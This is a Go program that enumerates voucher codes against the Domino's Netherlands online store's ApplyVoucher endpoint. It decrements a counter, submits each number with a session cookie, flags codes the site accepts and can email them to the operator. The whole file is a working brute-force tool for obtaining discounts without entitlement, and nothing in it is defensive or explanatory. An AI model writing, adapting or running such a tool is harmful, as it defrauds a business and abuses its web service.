package main

import (
	"os"
	"fmt"
	"net/http"
	"io/ioutil"
	"encoding/json"
	"time"
	"strings"
	"strconv"
	"mail"
)

// Type describing the response to a code inquiry.
type Code struct {
	Url 				string
	Messages 			[]string
	ResponseMessages 	string
}

// Return true if the code might be valid (no error message).
func isValid (c Code) bool {
	return len(c.Messages) == 0
}

// Returns a cookie for the request.
func getCookie (sessionID, storeName, storeNumber string) string {
	session := fmt.Sprintf("ASP.NET_SessionId=%s;", sessionID)
	name 	:= fmt.Sprintf("StoreName=%s;", storeName)
	number 	:= fmt.Sprintf("StoreNumber=%s;", storeNumber)
	return session + name + number 
}

// Return the GET request URL for a given voucher number. Padding is inserted.
func getVoucherURL (v int64) string {
	voucher := fmt.Sprintf("%d", v)
	url 	:= "https://bestellen.dominos.nl/estore/nl/Basket/ApplyVoucher?voucherCode="
	return url + voucher
}

// Queries dominos for valid pizza-codes (see header)
func main () {
	var to, from, pswd string;
	var usingMail bool;
	var c Code;
	client := &http.Client{}

	// Example: ./dominos Rotterdam 30782 99999 tgpl1p41rj3bbqwlcrdwmlnw
	if (len(os.Args) != 5 && len(os.Args) != 8) {
		fmt.Printf("usage: %s <StoreName> <StoreNumber> <Starting-Value> <Session-ID> [ <To> <From> <From-Pswd> ]\n", os.Args[0])
		return
	}

	if (len(os.Args) == 8) {
		usingMail = true
		to = os.Args[5]
		from = os.Args[6]
		pswd = os.Args[7]
	} else {
		usingMail = false
	}

	cookie := getCookie(os.Args[4], os.Args[1], os.Args[2])
	limit, err := strconv.ParseInt(os.Args[3], 10, 32)

	if err != nil {
		fmt.Printf("Err: Couldn't convert %s to an integer!\n", os.Args[3])
		return
	}

	for v := limit; v > 10; v-- {
		req, _ := http.NewRequest("POST", getVoucherURL(v), nil)
		req.Header.Set("Cookie", cookie)

		res, _ := client.Do(req)
		bodyBytes, _ := ioutil.ReadAll(res.Body)
		err = json.Unmarshal(bodyBytes, &c)
    	
		if (err != nil) {
			fmt.Printf("\n%d: Bad Response -> Will try again!\n", v)
			v += 1;
		} else {
			fmt.Printf("\r%d", v)
			if (isValid(c) == true) {
				if (usingMail) {
					mail.SendMail(v, to, from, pswd)
				}
				fmt.Printf("\n");
			} else {
				if (strings.Contains(c.Messages[0], "expired") == true) {
					fmt.Printf("\nErr: Session ID needs to be refreshed!\n")
					break
				}
			}
		}

		time.Sleep(1000 * time.Millisecond)
	}
}
